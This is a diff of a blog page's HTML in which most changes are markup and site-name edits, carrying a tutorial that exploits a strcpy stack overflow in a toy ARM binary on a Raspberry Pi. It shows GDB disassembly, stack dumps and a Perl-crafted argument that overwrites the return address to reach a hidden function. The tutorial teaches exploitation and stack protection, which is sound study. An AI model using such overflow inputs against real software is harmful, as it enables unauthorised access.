@@ -5,19 +5,19 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
-        <title>Buffer overflow on ARM architecture - Github personal blog</title><meta name="Description" content="Github personal blog"><meta property="og:title" content="Buffer overflow on ARM architecture" />
-<meta property="og:description" content="Prerequisites  A RaspberryPi and a distro. For this tutorial, I had an up-to-date Raspbian Stretch Lite with LXDE. GCC and GDB.  ARM registers and stack TODO
-An example of buffer overflow Initial state  We have a binary without its source code but compiled with debug information. We know how to use it: ./prog2 PASS where PASS is a 4-character string. We would like to know if there&rsquo;s interesting stuff or even dead code in it." />
+        <title>Buffer overflow on ARM architecture - Github personal blog</title><meta name="Description" content="Pascal Github page"><meta property="og:title" content="Buffer overflow on ARM architecture" />
+<meta property="og:description" content="Prerequisites A RaspberryPi and a distro. For this tutorial, I had an up-to-date Raspbian Stretch Lite with LXDE. GCC and GDB. ARM registers and stack TODO
+An example of buffer overflow Initial state We have a binary without its source code but compiled with debug information. We know how to use it: ./prog2 PASS where PASS is a 4-character string. We would like to know if there&rsquo;s interesting stuff or even dead code in it." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://pcotret.github.io/buffer-overflow-raspberrypi/" />
+<meta property="og:url" content="https://pcotret.github.io/buffer-overflow-raspberrypi/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-01-01T00:00:00+08:00" />
 <meta property="article:modified_time" content="2020-05-02T00:10:21+02:00" />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Buffer overflow on ARM architecture"/>
-<meta name="twitter:description" content="Prerequisites  A RaspberryPi and a distro. For this tutorial, I had an up-to-date Raspbian Stretch Lite with LXDE. GCC and GDB.  ARM registers and stack TODO
-An example of buffer overflow Initial state  We have a binary without its source code but compiled with debug information. We know how to use it: ./prog2 PASS where PASS is a 4-character string. We would like to know if there&rsquo;s interesting stuff or even dead code in it."/>
-<meta name="application-name" content="Github personal blog">
-<meta name="apple-mobile-web-app-title" content="Github personal blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="twitter:description" content="Prerequisites A RaspberryPi and a distro. For this tutorial, I had an up-to-date Raspbian Stretch Lite with LXDE. GCC and GDB. ARM registers and stack TODO
+An example of buffer overflow Initial state We have a binary without its source code but compiled with debug information. We know how to use it: ./prog2 PASS where PASS is a 4-character string. We would like to know if there&rsquo;s interesting stuff or even dead code in it."/>
+<meta name="application-name" content="Pascal Github page">
+<meta name="apple-mobile-web-app-title" content="Pascal Github page"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
         <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://pcotret.github.io/buffer-overflow-raspberrypi/" /><link rel="prev" href="https://pcotret.github.io/pcb-maison/" /><link rel="next" href="https://pcotret.github.io/aircrack-101/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
@@ -143,16 +143,16 @@ An example of buffer overflow Initial state  We have a binary without its source
 <p>Run GDB:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gdb prog2
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gdb prog2
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>What we can disassemble with GDB:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -182,35 +182,35 @@ An example of buffer overflow Initial state  We have a binary without its source
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) disassemble
-/usr/include/arm-linux-gnueabihf/bits/sys_errlist.h  __gmon_start__                                       frame_dummy
-/usr/include/arm-linux-gnueabihf/bits/types.h        __gmon_start__@plt                                   int
-/usr/include/libio.h                                 __init_array_end                                     long int
-/usr/include/stdio.h                                 __init_array_start                                   long long int
-/usr/lib/gcc/arm-linux-gnueabihf/6/include/stddef.h  __libc_csu_fini                                      long long unsigned int
-_DYNAMIC                                             __libc_csu_init                                      long unsigned int
-_GLOBAL_OFFSET_TABLE_                                __libc_start_main                                    main
-_IO_2_1_stderr_                                      __libc_start_main@plt                                prog2.c
-_IO_2_1_stdin_                                       __off64_t                                            puts
-_IO_2_1_stdout_                                      __off_t                                              puts@plt
-_IO_FILE                                             __quad_t                                             register_tm_clones
-_IO_lock_t                                           _bss_end__                                           short int
-_IO_marker                                           _edata                                               short unsigned int
-_IO_stdin_used                                       _end                                                 signed char
-__FRAME_END__                                        _fini                                                size_t
-__JCR_END__                                          _init                                                sizetype
-__JCR_LIST__                                         _start                                               stderr
-__TMC_END__                                          abort                                                stdin
-__bss_end__                                          abort@plt                                            stdout
-__bss_start                                          call_weak_fn                                         strcpy
-__bss_start__                                        char                                                 strcpy@plt
-__data_start                                         completed                                            sys_errlist
-__do_global_dtors_aux                                data_start                                           sys_nerr
-__do_global_dtors_aux_fini_array_entry               deregister_tm_clones                                 unsigned char
-__dso_handle                                         dont_touch_this                                      unsigned int
-__end__                                              exit
-__frame_dummy_init_array_entry                       exit@plt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) disassemble
+</span></span><span class="line"><span class="cl">/usr/include/arm-linux-gnueabihf/bits/sys_errlist.h  __gmon_start__                                       frame_dummy
+</span></span><span class="line"><span class="cl">/usr/include/arm-linux-gnueabihf/bits/types.h        __gmon_start__@plt                                   int
+</span></span><span class="line"><span class="cl">/usr/include/libio.h                                 __init_array_end                                     long int
+</span></span><span class="line"><span class="cl">/usr/include/stdio.h                                 __init_array_start                                   long long int
+</span></span><span class="line"><span class="cl">/usr/lib/gcc/arm-linux-gnueabihf/6/include/stddef.h  __libc_csu_fini                                      long long unsigned int
+</span></span><span class="line"><span class="cl">_DYNAMIC                                             __libc_csu_init                                      long unsigned int
+</span></span><span class="line"><span class="cl">_GLOBAL_OFFSET_TABLE_                                __libc_start_main                                    main
+</span></span><span class="line"><span class="cl">_IO_2_1_stderr_                                      __libc_start_main@plt                                prog2.c
+</span></span><span class="line"><span class="cl">_IO_2_1_stdin_                                       __off64_t                                            puts
+</span></span><span class="line"><span class="cl">_IO_2_1_stdout_                                      __off_t                                              puts@plt
+</span></span><span class="line"><span class="cl">_IO_FILE                                             __quad_t                                             register_tm_clones
+</span></span><span class="line"><span class="cl">_IO_lock_t                                           _bss_end__                                           short int
+</span></span><span class="line"><span class="cl">_IO_marker                                           _edata                                               short unsigned int
+</span></span><span class="line"><span class="cl">_IO_stdin_used                                       _end                                                 signed char
+</span></span><span class="line"><span class="cl">__FRAME_END__                                        _fini                                                size_t
+</span></span><span class="line"><span class="cl">__JCR_END__                                          _init                                                sizetype
+</span></span><span class="line"><span class="cl">__JCR_LIST__                                         _start                                               stderr
+</span></span><span class="line"><span class="cl">__TMC_END__                                          abort                                                stdin
+</span></span><span class="line"><span class="cl">__bss_end__                                          abort@plt                                            stdout
+</span></span><span class="line"><span class="cl">__bss_start                                          call_weak_fn                                         strcpy
+</span></span><span class="line"><span class="cl">__bss_start__                                        char                                                 strcpy@plt
+</span></span><span class="line"><span class="cl">__data_start                                         completed                                            sys_errlist
+</span></span><span class="line"><span class="cl">__do_global_dtors_aux                                data_start                                           sys_nerr
+</span></span><span class="line"><span class="cl">__do_global_dtors_aux_fini_array_entry               deregister_tm_clones                                 unsigned char
+</span></span><span class="line"><span class="cl">__dso_handle                                         dont_touch_this                                      unsigned int
+</span></span><span class="line"><span class="cl">__end__                                              exit
+</span></span><span class="line"><span class="cl">__frame_dummy_init_array_entry                       exit@plt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Lots of stuff there&hellip; We can find at least two interesting:</p>
 <ul>
@@ -220,7 +220,7 @@ __frame_dummy_init_array_entry                       exit@plt
 <p>Let&rsquo;s disassemble the main function</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -241,35 +241,35 @@ __frame_dummy_init_array_entry                       exit@plt
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) disassemble main
-Dump of assembler code for function main:
-   0x000104b8 &lt;+0&gt;:     push    {r11, lr}
-   0x000104bc &lt;+4&gt;:     add     r11, sp, #4
-   0x000104c0 &lt;+8&gt;:     sub     sp, sp, #16
-   0x000104c4 &lt;+12&gt;:    str     r0, [r11, #-16]
-   0x000104c8 &lt;+16&gt;:    str     r1, [r11, #-20] ; 0xffffffec
-   0x000104cc &lt;+20&gt;:    ldr     r3, [r11, #-20] ; 0xffffffec
-   0x000104d0 &lt;+24&gt;:    add     r3, r3, #4
-   0x000104d4 &lt;+28&gt;:    ldr     r2, [r3]
-   0x000104d8 &lt;+32&gt;:    sub     r3, r11, #8
-   0x000104dc &lt;+36&gt;:    mov     r1, r2
-   0x000104e0 &lt;+40&gt;:    mov     r0, r3
-   0x000104e4 &lt;+44&gt;:    bl      0x1032c &lt;strcpy@plt&gt;
-   0x000104e8 &lt;+48&gt;:    mov     r3, #0
-   0x000104ec &lt;+52&gt;:    mov     r0, r3
-   0x000104f0 &lt;+56&gt;:    sub     sp, r11, #4
-   0x000104f4 &lt;+60&gt;:    pop     {r11, pc}
-End of assembler dump.
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) disassemble main
+</span></span><span class="line"><span class="cl">Dump of assembler code for function main:
+</span></span><span class="line"><span class="cl">   0x000104b8 &lt;+0&gt;:     push    {r11, lr}
+</span></span><span class="line"><span class="cl">   0x000104bc &lt;+4&gt;:     add     r11, sp, #4
+</span></span><span class="line"><span class="cl">   0x000104c0 &lt;+8&gt;:     sub     sp, sp, #16
+</span></span><span class="line"><span class="cl">   0x000104c4 &lt;+12&gt;:    str     r0, [r11, #-16]
+</span></span><span class="line"><span class="cl">   0x000104c8 &lt;+16&gt;:    str     r1, [r11, #-20] ; 0xffffffec
+</span></span><span class="line"><span class="cl">   0x000104cc &lt;+20&gt;:    ldr     r3, [r11, #-20] ; 0xffffffec
+</span></span><span class="line"><span class="cl">   0x000104d0 &lt;+24&gt;:    add     r3, r3, #4
+</span></span><span class="line"><span class="cl">   0x000104d4 &lt;+28&gt;:    ldr     r2, [r3]
+</span></span><span class="line"><span class="cl">   0x000104d8 &lt;+32&gt;:    sub     r3, r11, #8
+</span></span><span class="line"><span class="cl">   0x000104dc &lt;+36&gt;:    mov     r1, r2
+</span></span><span class="line"><span class="cl">   0x000104e0 &lt;+40&gt;:    mov     r0, r3
+</span></span><span class="line"><span class="cl">   0x000104e4 &lt;+44&gt;:    bl      0x1032c &lt;strcpy@plt&gt;
+</span></span><span class="line"><span class="cl">   0x000104e8 &lt;+48&gt;:    mov     r3, #0
+</span></span><span class="line"><span class="cl">   0x000104ec &lt;+52&gt;:    mov     r0, r3
+</span></span><span class="line"><span class="cl">   0x000104f0 &lt;+56&gt;:    sub     sp, r11, #4
+</span></span><span class="line"><span class="cl">   0x000104f4 &lt;+60&gt;:    pop     {r11, pc}
+</span></span><span class="line"><span class="cl">End of assembler dump.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>No call to <code>dont_touch_this</code>. It means this is a dead code section. Why?</li>
-<li>Oh, <code>strcpy</code>! We found a breach! This functions must not be used nowadays as it doesn&rsquo;t check buffer length (<a href="https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml)">https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml)</a>. We should try a buffer overflow at this line.</li>
+<li>Oh, <code>strcpy</code>! We found a breach! This functions must not be used nowadays as it doesn&rsquo;t check buffer length (<a href="https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml%29" target="_blank" rel="noopener noreffer">https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml)</a>. We should try a buffer overflow at this line.</li>
 </ul>
 <p>If we disassemble <code>dont_touch_this</code>, we can get the entry point of this function (address <code>0x0001049c</code>):</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -281,47 +281,47 @@ End of assembler dump.
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) disassemble dont_touch_this
-Dump of assembler code for function dont_touch_this:
-   0x0001049c &lt;+0&gt;:     push    {r11, lr}
-   0x000104a0 &lt;+4&gt;:     add     r11, sp, #4
-   0x000104a4 &lt;+8&gt;:     ldr     r0, [pc, #8]    ; 0x104b4 &lt;dont_touch_this+24&gt;
-   0x000104a8 &lt;+12&gt;:    bl      0x10338 &lt;puts@plt&gt;
-   0x000104ac &lt;+16&gt;:    mov     r0, #0
-   0x000104b0 &lt;+20&gt;:    bl      0x1035c &lt;exit@plt&gt;
-   0x000104b4 &lt;+24&gt;:    andeq   r0, r1, r8, ror #10
-End of assembler dump.
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) disassemble dont_touch_this
+</span></span><span class="line"><span class="cl">Dump of assembler code for function dont_touch_this:
+</span></span><span class="line"><span class="cl">   0x0001049c &lt;+0&gt;:     push    {r11, lr}
+</span></span><span class="line"><span class="cl">   0x000104a0 &lt;+4&gt;:     add     r11, sp, #4
+</span></span><span class="line"><span class="cl">   0x000104a4 &lt;+8&gt;:     ldr     r0, [pc, #8]    ; 0x104b4 &lt;dont_touch_this+24&gt;
+</span></span><span class="line"><span class="cl">   0x000104a8 &lt;+12&gt;:    bl      0x10338 &lt;puts@plt&gt;
+</span></span><span class="line"><span class="cl">   0x000104ac &lt;+16&gt;:    mov     r0, #0
+</span></span><span class="line"><span class="cl">   0x000104b0 &lt;+20&gt;:    bl      0x1035c &lt;exit@plt&gt;
+</span></span><span class="line"><span class="cl">   0x000104b4 &lt;+24&gt;:    andeq   r0, r1, r8, ror #10
+</span></span><span class="line"><span class="cl">End of assembler dump.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Putting a breakpoint right after the <code>strcpy</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) break *0x000104e8
-Breakpoint 1 at 0x104e8: file prog2.c, line 14.
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) break *0x000104e8
+</span></span><span class="line"><span class="cl">Breakpoint 1 at 0x104e8: file prog2.c, line 14.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Running the program with valid input and checking registers and stack values:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) run AAAA
-Starting program: /home/pi/Documents/tutorial/prog2 AAAA
-Breakpoint 1, main (argc=2, argv=0x7efff684) at prog2.c:14
-14          return 0;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) run AAAA
+</span></span><span class="line"><span class="cl">Starting program: /home/pi/Documents/tutorial/prog2 AAAA
+</span></span><span class="line"><span class="cl">Breakpoint 1, main (argc=2, argv=0x7efff684) at prog2.c:14
+</span></span><span class="line"><span class="cl">14          return 0;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -341,41 +341,41 @@ Breakpoint 1, main (argc=2, argv=0x7efff684) at prog2.c:14
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) info registers
-r0             0x7efff524       2130703652
-r1             0x7efff7d7       2130704343
-r2             0x0      0
-r3             0x9      9
-r4             0x104f8  66808
-r5             0x0      0
-r6             0x10374  66420
-r7             0x0      0
-r8             0x0      0
-r9             0x0      0
-r10            0x76fff000       1996484608
-r11            0x7efff52c       2130703660
-r12            0x7efff524       2130703652
-sp             0x7efff518       0x7efff518
-lr             0x104e8  66792
-pc             0x104e8  0x104e8 &lt;main+48&gt;
-cpsr           0x20000010       536870928
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) info registers
+</span></span><span class="line"><span class="cl">r0             0x7efff524       2130703652
+</span></span><span class="line"><span class="cl">r1             0x7efff7d7       2130704343
+</span></span><span class="line"><span class="cl">r2             0x0      0
+</span></span><span class="line"><span class="cl">r3             0x9      9
+</span></span><span class="line"><span class="cl">r4             0x104f8  66808
+</span></span><span class="line"><span class="cl">r5             0x0      0
+</span></span><span class="line"><span class="cl">r6             0x10374  66420
+</span></span><span class="line"><span class="cl">r7             0x0      0
+</span></span><span class="line"><span class="cl">r8             0x0      0
+</span></span><span class="line"><span class="cl">r9             0x0      0
+</span></span><span class="line"><span class="cl">r10            0x76fff000       1996484608
+</span></span><span class="line"><span class="cl">r11            0x7efff52c       2130703660
+</span></span><span class="line"><span class="cl">r12            0x7efff524       2130703652
+</span></span><span class="line"><span class="cl">sp             0x7efff518       0x7efff518
+</span></span><span class="line"><span class="cl">lr             0x104e8  66792
+</span></span><span class="line"><span class="cl">pc             0x104e8  0x104e8 &lt;main+48&gt;
+</span></span><span class="line"><span class="cl">cpsr           0x20000010       536870928
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) x/16x $sp
-0x7efff518:     0x7efff684      0x00000002      0x00000000      0x41414141
-0x7efff528:     0x00000000      0x76e80678      0x76fa5000      0x7efff684
-0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
-0x7efff548:     0xf35a2f10      0xfb4ddc14      0x000104f8      0x00000000
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) x/16x $sp
+</span></span><span class="line"><span class="cl">0x7efff518:     0x7efff684      0x00000002      0x00000000      0x41414141
+</span></span><span class="line"><span class="cl">0x7efff528:     0x00000000      0x76e80678      0x76fa5000      0x7efff684
+</span></span><span class="line"><span class="cl">0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
+</span></span><span class="line"><span class="cl">0x7efff548:     0xf35a2f10      0xfb4ddc14      0x000104f8      0x00000000
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>In the stack, we can see our <code>AAAA</code> as <code>0x41414141</code> (ASCII codes, little-endian).</li>
@@ -384,36 +384,36 @@ cpsr           0x20000010       536870928
 <p>Same thing with longer input:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) run ABCDABCD
-Starting program: /home/pi/Documents/tutorial/prog2 ABCDABCD
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) run ABCDABCD
+</span></span><span class="line"><span class="cl">Starting program: /home/pi/Documents/tutorial/prog2 ABCDABCD
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) x/16x $sp
-0x7efff518:     0x7efff684      0x00000002      0x00000000      0x44434241
-0x7efff528:     0x44434241      0x76e80600      0x76fa5000      0x7efff684
-0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
-0x7efff548:     0xc9cf5894      0xc1d8ab90      0x000104f8      0x00000000
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) x/16x $sp
+</span></span><span class="line"><span class="cl">0x7efff518:     0x7efff684      0x00000002      0x00000000      0x44434241
+</span></span><span class="line"><span class="cl">0x7efff528:     0x44434241      0x76e80600      0x76fa5000      0x7efff684
+</span></span><span class="line"><span class="cl">0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
+</span></span><span class="line"><span class="cl">0x7efff548:     0xc9cf5894      0xc1d8ab90      0x000104f8      0x00000000
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>As expected, we find the <code>0x44434241</code> twice (corresponds to <code>DCBA</code>).</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -422,26 +422,26 @@ Starting program: /home/pi/Documents/tutorial/prog2 ABCDABCD
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) continue
-Continuing.
-
-Program received signal SIGSEGV, Segmentation fault.
-0x76e80600 in __libc_start_main (main=0x7efff684, argc=1996115968, argv=0x76e80600 &lt;__libc_start_main+156&gt;, init=0x104f8 &lt;__libc_csu_init&gt;,
-    fini=0x10558 &lt;__libc_csu_fini&gt;, rtld_fini=0x76fdf9b8 &lt;_dl_fini&gt;, stack_end=0x7efff684) at libc-start.c:247
-247     libc-start.c: No such file or directory.
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(gdb) continue
+</span></span><span class="line"><span class="cl">Continuing.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Program received signal SIGSEGV, Segmentation fault.
+</span></span><span class="line"><span class="cl">0x76e80600 in __libc_start_main (main=0x7efff684, argc=1996115968, argv=0x76e80600 &lt;__libc_start_main+156&gt;, init=0x104f8 &lt;__libc_csu_init&gt;,
+</span></span><span class="line"><span class="cl">    fini=0x10558 &lt;__libc_csu_fini&gt;, rtld_fini=0x76fdf9b8 &lt;_dl_fini&gt;, stack_end=0x7efff684) at libc-start.c:247
+</span></span><span class="line"><span class="cl">247     libc-start.c: No such file or directory.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>If we continue the program execution, we see a segfault while the return address is <code>0x76e80600</code>..
 There&rsquo;s already a buffer overflow here. However, it would be useful to redirect it to the <code>dont_touch_this</code> method to see what&rsquo;s in there.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">pi@raspberrypi:~/Documents/tutorial $ ./prog2 <span class="k">$(</span>perl -e <span class="s1">&#39;print &#34;ABCDABCD\x9c\x04\x01&#34;;&#39;</span><span class="k">)</span>
-The master key is 0xDEADBEEF
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~/Documents/tutorial $ ./prog2 <span class="k">$(</span>perl -e <span class="s1">&#39;print &#34;ABCDABCD\x9c\x04\x01&#34;;&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">The master key is 0xDEADBEEF
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>YES! We entered the dead code and found a master key 😈</p>
 <ul>
@@ -452,17 +452,17 @@ The master key is 0xDEADBEEF
 <p>If I tried my buffer overflow attack when the binary has been compiled with the stack protector, I would get the following message:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">*** stack smashing detected ***: ./prog2 terminated
-Aborted__
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*** stack smashing detected ***: ./prog2 terminated
+</span></span><span class="line"><span class="cl">Aborted__
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="references">References</h2>
-<p><a href="https://www.merckedsecurity.com/blog/smashing-the-arm-stack-part-1">https://www.merckedsecurity.com/blog/smashing-the-arm-stack-part-1</a></p>
-<p><a href="http://billyellis.net/">http://billyellis.net/</a></p>
+<p><a href="https://www.merckedsecurity.com/blog/smashing-the-arm-stack-part-1" target="_blank" rel="noopener noreffer">https://www.merckedsecurity.com/blog/smashing-the-arm-stack-part-1</a></p>
+<p><a href="http://billyellis.net/" target="_blank" rel="noopener noreffer">http://billyellis.net/</a></p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
